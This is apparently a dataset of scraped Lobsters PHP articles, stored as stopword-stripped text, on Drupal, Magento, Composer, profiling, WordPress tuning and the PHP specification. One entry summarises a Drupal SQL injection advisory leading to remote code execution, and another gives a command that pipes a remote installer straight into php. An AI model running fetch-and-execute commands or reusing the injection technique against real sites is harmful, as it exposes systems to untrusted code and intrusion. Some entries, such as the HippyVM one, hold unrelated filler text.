detailed definitely read need help using vagrant even example using composer create laravel app serverpilotapi readme serverpilot api restful allows manage serverpilot resource using http request response return json object including error seems typical serverpilot documentation readme excellent api let thing like list server connect new server list system user among many others example would list server seen gist request would return json similar loading paid account get pretty cool monitoring dashboard found screenshot post jake peterson appears serverpilot monitoring dashboard free plan obviously two paid plan one see get money pricing page end php developer use vps provider like digitalocean linode serverpilot probably worth checking even end using pretty neat something like even exists one feature really like see ability select certain package installed included plan definitely stand currently though definitely time saver well executed well work available hire always taking new client big small got project idea like discus startup plan developer make happen get touch love see help leave feedback got question updated information releavant post please leave comment comment great way get help read reply nearly every comment let talk like like loading related published tyler longren hi tyler longren freelance web developer father two beautiful daughter car stereo enthusiast like php javascript wordpress git neat thing really love open source community find twitter google github personal blog view post tyler longren published october
236,Lobsters,php,PHP programming,Drupal 7.31 pre Auth SQL Injection Vulnerability,https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html,drupal pre auth sql injection vulnerability,introduction drupal advisory released vulnerability,vulnerability drupals handling sql query allows sql injection remote code execution introduction drupal open source content management platform powering million website application built used supported active diverse community people around world drupal used vast number site vulnerable sourcecode audit customer found sql injection vulnerability drupal core handling sql query disclosed vendor bug attacker gain full control drupal site admin privilege without knowledge internals authentication site even execute php code without leaving trace log bug introduced early stayed well hidden core framework post discus sql injection higher level want technical detail please refer advisory released wait enough site time update release poc since severe bug allows attacker execute arbitrary code one http request knowledge site whatsoever vulnerability database query drupal handled via prepared statement placeholder used sql query indicate user input included select user name prepared statement called binding variable way attacker alter sql query since inject value prepared statement number placeholder correct therefore drupal us function expand name function handle array incorrectly expands array name name attacker control manipulate sql query look like select user name nametest name admin nametest result sql injection attacker full control database dump data delete whole database create new user example user control database insert value gain remote code execution web server using drupal feature callback stefan horst
237,Lobsters,php,PHP programming,Getting Started with Magento Development: 18 Essential Resources,https://blog.engineyard.com/2014/18-essential-magento-resources,getting started magento development essential resource,people ben mark marius strajeru ultimate module creator blog alan storm blog phillip jackson separate twitter account magento official damian culotta blog site magento stack exchange magento forum inchoo blog classy llama blog magento github magekarma magento connect module magerun http githubcomkalenjordanmagerunaddons module creator enhanced admin grid magmi magemailco kalen jordan miguel mbalparda,magento one popular ecommerce solution among developer day following list help understand ecosystem also help find latest news feature magento along best practice platform working particular framework good idea reliable resource make job easier list help understand ecosystem give latest news feature magento keeping updated best practice platform extremely useful coding since lot resource wild reliable well documented people people key community major part learning rope technology people community serve inform educate support well new developer enter community list influential member magento community ben mark official magento evangelist always latest news magento world event patch community question everything developer know magento ecosystem marius strajeru almighty marius undisputed magento stack exchange creator ultimate module creator stack exchange point may know everything least know look blog full resource even module make developer life lot easier alan storm top notch developer alan blog one technical magento community active stack exchange phillip jackson amazing developer top contributor stack exchange able answer question posted community hair separate twitter account magento official official magento account latest news use case event found damian culotta one best developer spanish speaking world blog must read spanish community site people next best resource location web find looking best resource magento stack exchange number one site magento developer central repository magento knowledge anyone ask community respond magento forum closed similar stack exchange closed refactored relaunched soon since forum read mode question asked wealth info existing post inchoo blog based eastern europe inchoo magento dev shop cover best practice written way anyone understand classy llama blog magento gold partner company blog business conference feature module must read developing magento github official repository magento new version built developer community providing lot useful feedback magekarma particularly useful using third party extension everything reviewed code feature pricing etc magento connect official extension channel like app store contains paid free extension module finally module piece code allow better extend magento setup list popular module magerun set tool developer used cli perform operation like creating customer settinggetting configs admin reindexing clearing cache addons http githubcomkalenjordanmagerunaddons module creator created marius strajeru allows create module couple click extremely easy use really good beginner enhanced admin grid magento admin grid extending always easy module help create customized grid edit existing one click making client requirement easy handle magmi project attempt provide product importer magento handle several thousand product reasonable pace compared magento dataflow module used moving information magento site environment making thing easier developer magemailco created kalen jordan merchant increase roi one best option transactional email magento amazing support anyone better developer simply participating community trying answer question stack exchange writing blog post strenght framework lay community magento proved point ebay even taken consideration development new version magento good set newcomer seasoned developer looking updated important subject related platform event update community news magento dev resource missed anything like share people getting started magento community throw u comment miguel miguel developing magento almost year covered magento world developing month ago certified solution specialist one home country argentina miguel enjoys integration magento third party apis found twitter mbalparda
238,Lobsters,php,PHP programming,Profiling PHP Part 3: Practical Performance Tuning,https://blog.engineyard.com/2014/profiling-with-xhprof-xhgui-part-3,profiling php part practical performance tuning,part one part two performance tuning opcode caching content caching total cache wp super cache query caching mysqltuningprimer script memcached riak cassandra redis query optimization noted earlier meta operator code optimization least twice wordpress bug tracker new relic new relic uprofiler uprofiler xhprofio xhprofio xdebug xdebug kcachegrind webgrind closing,part one series introduced xhprof part two took indepth look xhgui ui third final installment let put xhprofxhgui knowledge work performance tuning great code code never run everything else good code start performance tuning best option first ensure little code run possible opcode caching first quickest easiest option enable opcode cache information opcode cache found see happens enabling zend opcache first row baseline without cache enabled middle row see small performance improvement big reduction memory usage small performance gain probably optimization performed zend opcache addition opcode caching top row optimization opcode caching see large performance gain take look apc contrast zend opcache see performance degradation initial middle request cache built time taken memory used see similar performance increase cached opcodes content caching second thing cache content easy option wordpress number easy install plugins u including wp super cache wp super cache create static version site expire automatically thing like comment occur depending setup highload situation example may want disable cache expiration reason content caching work effectively writes operation invalidate cache compared read also caching content received application third party apis thereby limiting latency reliance availability api wordpress two cache plugins drastically improve performance site total cache wp super cache create static html copy site serve instead generating page every time requested well compressing response developing application framework caching module query caching another caching option query caching mysql general query cache help tremendously database addition query cache mysql caching result set memory cache like memcached cassandra prove beneficial content caching effective readheavy scenario mysql query cache particular relied upon performance easy invalidate large segment cache minor change data query caching may help performance generating content cache seen turn query caching see wall time reduced although memory usage change meaningful way three type caching option available controlled querycachetype setting setting value disable cache setting value cache selects except start select sqlnocache setting value demand cache selects start select sqlcache also set querycachesize nonzero value setting zero disable cache regardless querycachetype setting help setting numerous performance related setting check mysqltuningprimer script primary issue mysql query cache global change table part cached result set cause cache invalidated highwrite application make cache next useless however option use build intelligent caching based need knowledge dataset memcached riak cassandra redis query optimization noted earlier database query common cause slowdown performing query optimization likely low hanging fruit give benefit optimizing code query optimization help performance generating content cache well helping worst case scenario able cache addition profiling another option mysql help identify slow query slow query log slow query log log query take longer specified time optionally query use index enable log using following configuration mycnf mysqld logslowqueries varlogmysqlmysqlslowlog longquerytime logqueriesnotusingindexes query slower longquerytime second query logged log file logslowqueries default value second minimum second additionally logqueriesnotusingindexes option make query using index captured log examine log using mysqldumpslow command bundled mysql using option wordpress install get following loading homepage running mysqldumpslow g wp varlogmysqlmysqlslowlog reading mysql slow query log varlogmysqlmysqlslowlog count user user host select optionname optionvalue wpoptions autoload count user user host select userid metakey metavalue wpusermeta userid n first note string value anonymized number n stop supplying flag next notice query took mean came second threshold must mean index used examine cause slowdown explain mysql console mysql explain select optionname optionvalue wpoptions autoload sg row id selecttype simple table wpoptions type possiblekeys null key null keylen null ref null row extra using see possiblekeys null confirming index used explain powerful tool optimizing mysql query information found postgresql also includes explain quite different mysqls mongodb explain meta operator code optimization typically point longer hampered php using opcode cache cached much content possible optimized query ready start tweaking code code query optimization also need performance create cache better performant code worst situation cache stable app quicker able rebuild cache let walk potentially optimizing wordpress install first let take look slowest function surprisingly first item list mysql fact mysqlquery fourth instead applyfilters function know wordpress codebase feature eventbased filter system perform multiple transformation data sequentially added core plugins callback applyfilters function callback applied first thing might notice function called time click view detail order parent function table call count descending reveal call applyfilter translate function interesting actually use translation given suspect majority user use wordpress software native language english let take look translate function clicking detail see two interesting thing first see parent one called time looking source code function see wrapper translate php retrieves translation text translation domain nt loaded original text returned see translate alias translate since param string text text translate param string domain optional domain retrieve translated text return string translated text function text domain default return translate text domain rule thumb function call expensive avoided given always calling instead translate instead flip alias translate alias preserve backwards compatibility call unnecessary function realistically though change going make much difference microoptimization improve code readability simplify callgraph moving let look child function getting meat function see functionsmethods called time gettranslationsfordomain nooptranslations translate applyfilters ordering inclusive wall time descending see applyfilters far expensive call looking code see php function translate text domain default translation gettranslationsfordomain domain return applyfilters gettext translation translate text text domain code retrieving translation object passing result translation translate applyfilters tell list translation instance nooptranslations class based name alone noop confirmed helpful comment code see translator fact anything php provides interface translation nt anything class nooptranslations perhaps avoid code entirely little debugging code see using default domain let change code ignore translator using php function translate text domain default domain default return applyfilters gettext text text domain translation gettranslationsfordomain domain return applyfilters gettext translation translate text text domain next profile sure run least twice ensures cache built fair comparison run faster much find using xhgui compare run feature going back original run click compare run button topright choose new run list see reduced number function call inclusive wall time inclusive cpu time order detail table call count ascending order confirms expected see reduction call gettranslationsfordomain nooptranslations translate importantly confirm unexpected change occurred performance improvement great minute work translates real world performance gain even applied opcache repeat procedure function keep find optimize note change submitted wordpressorg updated follow discussion see process practice wordpress bug tracker scheduled inclusion wordpress addition fantastic xhprofxhgui several great tool available new relic new relic provides front backend performance analytics phenomenal insight entire backend stack including sql query code well frontend dom cs rendering well javascript uprofiler uprofiler asyet unreleased fork facebooks xhprof intent removing cla required facebook present identical term featureset renaming taking place xhprofio xhprofio alternative ui xhprof xhprofio us mysql profile storage user friendly xhgui xdebug xhprof came onto scene xdebug xdebug active profiler mean never used production offer fantastic insight code however must paired another tool read profiler output kcachegrind difficult install nonlinux machine much easier alternative webgrind webgrind provide nearly featureset kcachegrind php web app easy install pretty much anywhere paired kcachegrind easily explore find performance issue fact preferred view profiling tool closing profiling performance tuning complex subject right tool good understanding use examine improve code tremendously even codebases much experience definitely worthwhile taking time explore learn tool
239,Lobsters,php,PHP programming,WordPress Performance Tuning (100x Improvement),https://blog.engineyard.com/2014/wordpress-in-the-cloud-part-5,wordpress performance tuning improvement,first post second post freeze cluster cattle server third post relying filesystem fourth post new relic cloudflare enter blitz blitz blitz addon page authorization page engine yard dashboard dashboard addon page testing single instance set blog dashboard set ssh key add account install environment play testing cluster cache thing total cache apc freeze deploy limit conclusion previous post point,last post five part series cover basic getting wordpress running engine yard first post covered get basic install deployed second post introduced way make modification locally freeze deployed cluster cattle server third post looked two approach installing plugins locally got bucket set serve image relying filesystem ephemeral fourth post set new relic application monitoring cloudflare site speedup analytics security protection phew quite lot post going bring together test performance setup see anything improve enter blitz engine yard offer blitz addon meaning account creation billing handled engine yard account blitz cloudbased loadtesting tool complete snap use point website tell many user want send watch graph site performance load real time plenty feature like integration continuous deployment setup covering post get started head blitz addon page making sure log click set done click blitz dashboard welcome new blitz account continue need authorise domain going test security requirement make sure operator site want loadtest visit blitz authorization page grab filename displayed look something like open terminal navigate site git checkout run echo need change public directory similar wordpress served add change git commit push log engine yard dashboard find app click deploy button wait deployment complete click http link application master instance add end url check file served correctly full url checking look something like http work white page number go blitz dashboard find part invite add domain going testing application instance grab http link one plug verify authorised application instance continue log new relic account using new relic monitor cpu usage throughout test head new relic addon page click new relic dashboard leave window open separate tab testing single instance first set blog opted use production configuration environment meaning one application master one application instance start testing going disable application instance removing loadbalancing pool ie http request balanced meaning testing ability master handle request go engine yard dashboard find instance say application instead application master click ssh link open terminal log need set ssh key add account install environment run sudo etcinitdnginx stop stop nginx webserver take instance haproxy pool meaning request sent next grab http link application master instance head blitz play screen plug url application master set following parameter type rush timeout user start user end duration mean blitz going take minute gradually building traffic one visitor simultaneous visitor called rush test set timeout second want see slow site high load matter slow get ready press big play button result got see application instance able handle load impact response latency right point serve around simultaneous user point increase number simultaneous user response time start slow see graph increase response latency linear increase user great server grinding halt slowing proportion amount work throwing switch back new relic tab navigate server find server corresponds application master select able see overview cpu load mine looked like nothing unexpected large spike cpu usage drop experiment finish see load spiked end experiment simultaneous user response taking second complete real site user would think site would probably leave testing cluster single instance look like let bring application instance pool see performance look like sharing workload two instance ssh back application instance master run sudo etcinitdnginx start start nginx webserver brings instance back haproxy pool meaning request load balanced go back blitz another rush keeping setting got okay seeing application cluster handled increasing load without degradation performance somewhere concurrent user mark make sense previous test told u application master handle concurrent user without performance degradation sharing workload two machine number approximately double relationship load performance linear target range concurrent user actually want performance constant matter load pushing app performance bound linear performance degradation better nonlinear one cpu application master nothing surprising maxing cpu graph looked application instance note case database instance hardly break sweat work done assembling page php mean blog well current state handle concurrent user performance start suffer quite lot user way blog need day day basis might still struggle post get popular social medium news cache thing cpu time spent inside php assembling page speed perhaps eliminate entirely yup sure total cache wordpress plugin plugin quite lot feature making use experiment interested functionality us apc store result expensive operation inside php install plugin using one freeze deploy method outlined previously checked changed file redeployed open blog admin find plugin activate go setting page turn page cache select apc store result computationally expensive page generation visit page cached pulled directly ram wanted get fancy could configure total cache use memcached need spin memcached instance environment would allow application instance share cache blog important going skip turn object cache select apc le important page cache really speed response php computation needed may well turn caching merrier leave rest config setting find click save setting button get notice pop probably safe dismiss got one file permission important go back blitz another rush keeping setting got impressive huh let take look going first thing notice scale axis gone second response time range response took second fact see start experiment response time highest caching start kick total cache level operating system level response time actually drop quite considerably eventually levelling blazingly fast cpu data new relic application master hardly broke sweat peak load safe say setup blog handle concurrent user absolutely performance degradation whatsoever mean term daily hit well experiment averaged hit per second equates hit per day could push app look thing much limit let crank dial blitz rush see cause performance degradation see limit time set end user target saw okay familiar looking graph seems like found application performance limit somewhere around concurrent user mark app start slow little say little mean little whereas first experiment saw response time climb second seeing max response time second slow probably slow enough turn away user load concurrent user bad cpu graph interesting cpu maxed still seeing low response time config cpu spent fetching item cache still lot work many concurrent user individual request lot easier computational perspective respond conclusion blitz easy tool loadtesting apps cloud tested single application instance tested application cluster gave u understanding application performance range important thinking prepare site expected amount traffic installing plugin cache expensive operation u able dramatically increase performance range going max concurrent user max concurrent user cloudflare previous post installed cloudflare help improve performance include reason loadtest cloudflare proxy server look like do attack trip cloudflare security safeguard great exactly want production site cloudflare point loadtesting useful figuring app real performance range cloudflare increase performance top caching global cdn p think experience scaling wordpress method make sense throw u comment
240,Lobsters,php,PHP programming,Profiling PHP Part 1: Intro to Xhprof & Xhgui,https://blog.engineyard.com/2014/profiling-with-xhprof-xhgui-part-1,profiling php part intro xhprof xhgui,profiling profile code cloning environment engine yard cloud common cause slowdown profiler active v passive profiling xhprof xhgui installing installing xhprof pecl installing xhgui http githubcomperftoolsxhgui alternative configuration note running xhgui running profiler must next next installment indepth look xhgui,profiling profiling measuring relative performance application codelevel profiling capture thing like cpu usage memory usage time number call per function well capturing call graph act profiling impact performance differs benchmarking benchmarking performed externally measure actual performance endusers see profile code first thing determine thinking profiling performance issue need quantify ask big problem fall trap premature optimization may well waste time determine even problem decide goal performance example concurrent user le response time need benchmark see meeting goal one common mistake people make benchmarking development staging environment must perform benchmark production hardware either actual production live copy latter easily achieved cloud see cloning environment engine yard cloud many option benchmarking including ab siege jmeter personally prefer featureset jmeter ab siege much simpler use determined indeed performance issue profile code make fix benchmark see issue gone away benchmark every individual change make many change might find performance negatively impacted idea specific change caused problem call performance lifecycle common cause slowdown number common cause slowdown contrary people might think even highlevel language like php code rarely issue unlikely cpubound problem arise today hardware common cause datastore postgresql mysql oracle mssql mongodb riak cassandra memcache couchdb redis external resource apis filesystems network socket external process bad code profiler two distinct type profilers phpworld active passive active v passive profiling active profilers used development enabled initiated developer active profilers gather information passive profilers impact performance larger way active profilers used production scenario xdebug active profiler inability use active profilers production facebook introduced passive profiler xhprof xhprof built usage production environment minimal impact performance still gathering enough information diagnose performance issue xhprof new relic passive profilers typically additional data gathered xdebug needed general performance problem meaning passive profilers better option alwayson profiling even development xhprof xhgui xhprof created facebook includes basic ui reviewing profile data additionally paul reinheimer created xhgui enhanced ui project reviewing comparing analysing profile data installing installing xhprof xhprof available via pecl installation simple pecl install xhprofbeta pecl command try update configure phpini automatically file pecl try update found using following command pecl configget phpini simply add new configuration line top indicated file may want move appropriate location extension compiled must enable need add following php ini file xhprof extensionxhprofso combine xhgui easily perform profiling review installing xhgui install xhgui must directly git project found github http githubcomperftoolsxhgui xhgui requires php extmongo composer mongodb optional collection required analysis first clone project wherever want live debianbased eg ubuntu others linux machine might varwww mac o x might librarywebserverdocuments cd varwww git clone http githubcomperftoolsxhguigit cd xhgui php installphp last command run composer install dependency check permission xhgui cache directory fails run composer install hand next may need create config easily done using default config found pathtoxhguiconfigconfigdefaultphp running mongodb locally without authentication likely need fault back default multiserver environment however want single remote mongodb server server store need configure appropriately enhance mongodb performance add index running following mongo use xhprof dbresultsensureindex metaserverrequesttime dbresultsensureindex profilemain wt dbresultsensureindex profilemain mu dbresultsensureindex profilemain cpu dbresultsensureindex metaurl alternative configuration wish install mongo production environment difficulty enabling access web server mongo server save profile data disk import local mongodb later analysis change following configphp php savehandler file savehandlerfilename pathtoxhguixhprof uniqid true dat changing savehandler file uncommenting savehandlerfilename setting appropriate value note default save one profile per day ready analyze data import using script included xhgui php pathtoxhguiexternalimportphp pathtofiledat point process running xhgui xhgui php web application setup standard virtualhost using pathtoxhguiwebroot document root alternatively simply use php cliserver like cd pathtoxhgui php webroot make xhgui available via port network interface running profiler run profile need include externalheaderphp script page wish profile easily setting autoprependfile php ini setting done directly global ini file limit single virtual host apache add following virtualhost phpadminvalue autoprependfile pathtoxhguiexternalheaderphp nginx add following server block fastcgiparam phpvalue autoprependfilepathtoxhguiexternalheaderphp using php cliserver php must pas setting via command line flag php dautoprependfilepathtoxhguiexternalheaderphp default profiler run approximately run controlled following code snippet externalheaderphp php rand return want run every request example development simply comment want run run could change php rand return allows profile small portion user request impacting individual user much many user overall want manually control profiling occurs could use something like php isset request isset cookie return else remove trace special variable requesturi server requesturi strreplace array server requesturi setcookie isset request setcookie time return check randomly named getpostcookie variable case set cookie name allow profiling part request example redirects form submission ajax request etc furthermore allows getpost value remove cookie stop profiling next next installment take indepth look xhgui ui reviewing comparing data xhprof
241,Lobsters,php,PHP programming,Using Composer for Magento,https://blog.engineyard.com/2014/composer-for-magento,using composer magento,composer composer pear packagist firegento let get composing configuring composer consult documentation using composer conclusion official documentation,guide using composer manage magento extension find managing extension difficult heard composer know start guide composer composer package manager php mean manages many different php package intended magento composer created alternative aging pear modern architecture npm nodejs bundler ruby composer package project specific installed vendor unless explicitly installed systemwide packagist website show package installed composer also repository magento specific package available firegento website packagist used default repository composer add firegento repository editing composer configuration file first however need install composer let get composing three way install composer first method one recommended composer developer curl http getcomposerorginstaller php run command line composer magically appear system could also save output review piping php course concerned legitimately executing unsandboxed code straight internet another way installing composer downloading composerphar wget http getcomposerorgcomposerphar put toplevel root project directory structure later want actually run composer execute script php rather running installed command like php pathtocomposerphar alternatively install systemwide running something like mv composerphar usrlocalbincomposer assuming usrlocalbin path composer available systemwide using o x install composer using homebrew brew update brew install homebrewphpcomposer using homebrew highly recommended o x also result systemwide composer command configuring composer composer configured perproject basis every php project create need write composer configuration file file called composerjson life toplevel root project directory structure rather explaining every possible field one mean consult documentation easier learn example simple example copy paste modify requirement name yournicknameyourprojectname license type magentomodule description description project homepage http examplecomyourprojecthomepage require magentohackathonmagentocomposerinstaller phpunitphpunit requiredev ecomdevmageci devmaster author name name extra magentorootdir magento example project called yournicknameyourprojectname depends standard version phpunit development version mageci example obviously change detail require value example real world representative common magento module dependency may also noticed magentocomposerinstaller listed evident name essential part composer machinery context magento ecosystem magento project package isolated specific subdirectory instead spread amongst template theme locale directory need tool manage spreading data tool magentocomposerinstaller listing magenocomposerinstaller requirement composer automatically resolve download u use handle magento package dependency proper magento way may want make sure part setup visible outside world want encapsulate public section subdirectory use magentorootdir property indicate extra example value set subdirectory magento want use subdirectory set value instead using composer resolve dependency project change directory toplevel root issue following command installed systemwide command local composerphar php composerphar install install latest version specified package meet version criterion specified also create composerlock file commit file repository use composer install reinstall exact version example another developer work project deploy production ensures everybody version want update package run composer update recommit composerlock others composer install update specific package use composer update packagename adding deleting requirement easy using composer require packagename version remove package simply update composerjson run composer update packagename running composer require without argument allow add package interactively conclusion went basic setting composer especially work magento easily add remove dependency magento extension lot composer official documentation detail intricacy may need become acquainted find guide helpful using composer project think compare pear package manager language love hear actively reading participating comment thread please leave u note
242,Lobsters,php,PHP programming,HippyVM - beta released on github,http://hippyvm.com/blog.html#update-mediawiki-github-brno,hippyvm beta released github,check origin learn cs handcode colour presentation exercise restraint basic promotion basic optimization tutorial write html blog design http hippyvmcom,basically understanding html tag method turn great web designer everyone may plus still result garbage within guidance guide providing crucial guideline generally location begin towards making great site right track find lot link help lesson throughout check origin searching different site sourcecode superb method get method html technique learn cs cs would significant improvement within webmaster earth within last several year allow appearance whole website alter enhancing one record permit one structure design page appear much better handcode handcoding text editor suggests find issue realize code definitely better modify smaller item definitely better control style colour ensure great distinction text color history keep primary text dark many area presentation design site block utilizing level table structure posse defined information navigation extra container people may know search certain area site exercise restraint simplicity effective basic promotion begin publishing page towards search engine whenever website prepared web basic optimization enhance site like using gif picture small image optimize graphic omit many medium separate long page smaller one tutorial write html blog design http hippyvmcom
243,Lobsters,php,PHP programming,Notejam: Easily Learn a Web Framework,http://longren.io/notejam-easily-learn-a-web-framework/,notejam easily learn web framework,easy way learn web framework notejam komarserjio twitter downloaded github view various screenshots github well work get touch leave feedback leave comment like published twitter google github view post tyler longren published,easy way learn web framework notejam provides easy way learn new web framework kind web framework php python ruby javascript nodejs notejam describes like know djangolaravelsymfonyetc want try railsflaskpyramidetc easy way start new framework compare framework already know goal project help developer easily learn new framework example notejam unified sample web application hello world implemented using different serverside framework currently popular python php ruby framework supported implementation notejam sqlite based launched builtin web server implementation step describing easily install launch run test notejam developed serhii komar komarserjio twitter notejam downloaded github view various screenshots github well well work available hire always taking new client big small got project idea like discus startup plan developer make happen get touch love see help leave feedback got question updated information releavant post please leave comment comment great way get help read reply nearly every comment let talk like like loading related published tyler longren hi tyler longren freelance web developer father two beautiful daughter car stereo enthusiast like php javascript wordpress git neat thing really love open source community find twitter google github personal blog view post tyler longren published august
244,Lobsters,php,PHP programming,"Hack - A safer, faster PHP alternative on the HHVM",http://hacklang.org/,hack safer faster php alternative hhvm,,hack provides instantaneous type checking incrementally checking file edit typically run le millisecond making easy integrate development workflow without introducing noticeable delay
245,Lobsters,php,PHP programming,Critiquing Facebook’s new PHP spec,http://blog.circleci.com/critiquing-facebooks-new-php-spec/,critiquing facebook new php spec,note publisher doc initial draft specification php care think php compiler wrote phd circleci rant hiphop quick summary specification embedding extending php terminology deviation ibm wrote paper php memory model description memory model j spec reference counting tease exact detail nitty gritty detail answer describes great detail deferred array copying imperfection garbage collection edit thanks hn user wvenable pointing array cursor threading array cursor internal alias example overflow choice overflow work welcome specification discus hn,note publisher managed find old content may outdated andor incorrect try searching doc current information yesterday facebook released initial draft specification php written team facebook employee including veteran many specification committee look like serious effort provide needed specification language gone without long time thought take look see good care think start might worth mentioning background worked php compiler year implemented lot code generation static analysis optimization php wrote phd heard apart circleci blog probably rant hiphop one people outside facebook php community built compiler php author advanced static analyzer php excluding one thought php spec might interesting larger audience quick summary let summarize post saying love specification linking version current time writing fact wrote spec awesome love specification php sorely needed one truly think well done describes current implementation exceptionally well clear ton expertise understanding php work exceptionally clear well written able find single flaw semantics programming language world mean language quick aside phd discussed php along ruby python others language defined implementation really one good discussion php implementation work book sara golemon called embedding extending php book serf reference entire php implementation dogeared copy read cover cover four time basically taught php memory model people qualified discus implication copyonwrite changeonwrite set weirdness php implementation effect semantics author sara golemon surprise really one folk leading charge hhvm team sara feel like indicative quality saw spec terminology since overloaded term post going refer php interpreter refer php language refer php specification deviation one interesting thing place chosen deviate zend engine thing interesting political move couple place spec say implementation choose implement language implementation go different way case pretty well chosen although reasoning presented pretty clear goal allowing hhvm deviate weird corner case interesting changing definition language sort backchannel allowing breaking change effectively deciding implementation choice equally valid give example get little known bug zend engine around copying array contain reference ibm wrote paper bug basically bug necessary zend make copying array fast ibm figured way way actually correct performance penalty spec describes use case great detail say need implement way say source vstore refcount greater engine us implementationdefined algorithm decide whether copy element using value assignment destination source byref assignment destination source one eighteen time spec use phrase actually let implementation choose different way zend way assume hhvm way reasonable option actually reasonable option presume came directly requirement hhvm effectively saying want bound decade old free hhvm implement actually change rule zend implement going forward nice move opinion php memory model one best thing spec description memory model technical term variable value assignment stuff made interesting choice specify rather trying specify exact algorithm everything j spec typically example chose describe zend model close enough say appear work like spec provides highlevel model based idea variable called vslots separately value called vstores hold integer scalar refer object string array extra thing called hstore object array kept get crux zend memory model really strong abstraction perfectly representative zend actually work hood also say tell difference zend think correct least think counterexample spent long time thinking weird counter example also one area writing really good perfect part describe complicated stuff clear language systematically going edge case whether assignment array whether value involved reference whether assignment reference high quality stuff reference counting one thing abstract reference counting zend implemented using reference counting reference counting allows zend implement optimization called mean zend engine copy value actually copy increment reference count say copied value get changed later copy happens lazily change happens since semantics sometimes leak world would imagine spec would need include referencecounting semantics instead tease exact detail copyonwrite semantics describe highlevel term example really powerful way avoid hamstringing future implementors specifying zend behaviour nitty gritty detail good test php knowledge describe difference new point new point answer forget think next assignment something odd honestly remember subtlety however clearly author forgotten subtlety spec describes great detail want understand php idiosyncrasy ignore inconsistent parameter ordering reference semantics real mess make good read one interesting discussion spec around array thing ibm paper mentioned earlier array contains value reference another value go copy array choice referenced value exist array make copy like array well latter probably make sense zend implement former example spec code trigger behaviour x array x b x unset x b b echo b spec say choose different way implement presume hhvm chose different algorithm zend least zend choice make sense least fast anyone relying behaviour deserves get imperfection much like spec think mistake one description garbage collection spec declares gc memory hold variable end scope variable automatic storage duration come initialized declaration first use declaration lifetime delimited enclosing scope automatic variable lifetime end end scope automatic variable lend stored stack help support argument passing recursion local variable include function parameter automatic storage duration reading say must keep variable alive fall scope function end example similarly engine must reclaim vslot storage duration corresponding variable end variable explicitly unset programmer script exit whichever come first case vslot contained within hstore ie array element object instance property engine must immediate reclaim vslot explicitly unset programmer containing hstore reclaimed script exit whichever come first read saying variable dy must immediately clear suspect make gc little le flexible example advanced garbage collector might want keep variable alive little bit longer alternatively implementation might want share storage pair variable know alive time read allow edit thanks hn user wvenable pointing one side effect new gc behaviour hstore representing object reclaimed immediately great writing implementation gc cleaning object later ideal advanced garbage collector great rely raii zend engine currently support look like going pretty big language change go implementation supporting raii would still allowed required raii mean acquisition mean grab everything need constructor free destructor possible language like c explicit rule must call destructor something go scope say java finalizers run gc get around zend effectively rule spec closer rule array cursor threading one thing specified array cursor internal honest much like description array might computer scientist php ordered map really would manifest new php implementation wanted use different threading model would two thread looping array use cursor sound pretty racy perthread cursor optional external cursor might good option leaving door open might useful alias also thrilled wording chose use word like way strictly correct least confusing since word hold different meaning use spec example say two vslots variable hold value reference aka agree alias technical sense definition excludes aliased value two variable pointing object would two vslots pointing two vstores pointing one hstore terminology way might good time reflect specific nitpicking imagine good job whole thing depth go find something wrong overflow said think choice overflow work unfortunate allow implementation define type value overflow think really bad idea call purist think specific understanding exactly happens integer overflow suspect reason choice poor facebook want go different direction hhvm loved approach deferred array copy seems harsh condemn happy integer overflow important still likely hamstrung implementation remain valid since zend definition correct implementation welcome specification overall say pretty great spec welcome addition php implementation repertoire clear work remains highlight explanation poor etc feel confident close excellent doc hhvm team great job discus hn
246,Lobsters,php,PHP programming,Announcing a Specification for PHP,http://hhvm.com/blog/5723/announcing-a-specification-for-php,announcing specification php,linguafranca serverside web programming userdocumentation thought discussed announced sara sample chapter overwhelmingly positive entirety initial draft specification released world git repository phpnet mirrored github pull request feedback rex jaeschke drew paroski paul tarjan sara golemon fred emmott josh watzman hhvm stanislav malyshev nikita popov read comment,php language around year clearly one popular programming language world php definitely linguafranca internet serverside web programming extensive userdocumentation php language always missing language specification say specification thought discussed one never really come fruition chinese philosopher lao tzu stated journey thousand mile begin single step excited announce initial draft specification php existence specification announced sara oscon feedback announcement sample chapter overwhelmingly positive entirety initial draft specification released world hosted git repository phpnet repo mirrored github please read specification provide pull request feedback hope expect specification evolve time help everyone care php language thank php group taking mantle providing infrastructure hosting development specification helping shepherd truly communityowned developed project special thanks must given rex jaeschke lead actual writing specification drew paroski pivotal review effort helped rex shape spec initial form thanks paul tarjan sara golemon fred emmott josh watzman rest hhvm team awesome contribution feedback thank stanislav malyshev nikita popov early look specification provided valuable feedback language specification may flashiest thing world programming humble opinion exciting day php language read comment radu murzea excellent news amazed far along progress already guy made day phpuser well good news nt mix internet web year later php language specification http year later php language specification http alexandru cobuz well php get fast willing learn make php extension close c performance take look zephir benchmark still great thing php decided gain speed since popular globe jacek kobus one small step man one giant leap mankind php 語言的定義 geasuan lin blog hhvm 的人決定起草將 php specification developer announcing specification php daniele filaretti good hear also specification independently developed formal executable semantics php wwwphpsemanticsorg presented tomorrow conference wish spec two year ago james dicken php definitely linguafranca internet seb nailing spec bunch phpt file mean spec executable day php phpt thingie best afaik ok job mathieu arnold wait wait april announcing specification php die wunderbare welt von isotopp announcing specification php php language around year clearly one popular programming language world php definitely linguafranca internet extensive userdocumentation php language always missing language specification say specification joel marcey yeah thought might cause little bit controversy writing decided leave serverside internet programming think doubt clientside yeah maybe little dubious allinall php right one used programming language internet whole announcing specification php wordpress c h ronicle visit hhvm paul biggar wrote critique spec thought guy might find interesting http blogcirclecicomcritiquingfacebooksnewphpspec sd time news digest july io source code official php spec custom android fork project ara sd time hiphop virtual machine technical writer joel marcey announced released php spec blog post along php core developer sara golemon announcement initial draft specification php get formal specification last popfix celebrity tech sport news developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last news around world developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last jumbosky money developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last wizeguys developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last protect pc tip advice support protect pc tip advice support developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last techrsscom developer oversee language including engineer facebook assembling document detail php work set stage building additional php get formal specification last qwerteu blog developer oversee language including engineer facebook assembling document detail php work set stage building additional yebaacom php get formal specification last developer oversee language including engineer facebook assembling document detail php work set stage building additional facebook share opensource project busy week facebook opensource front social network announced release language specification php well sharing three javascript project flux immutablejs facebook share opensource project insertion hoarder week facebook opensource front social network announced release language specification php well sharing three javascript project flux 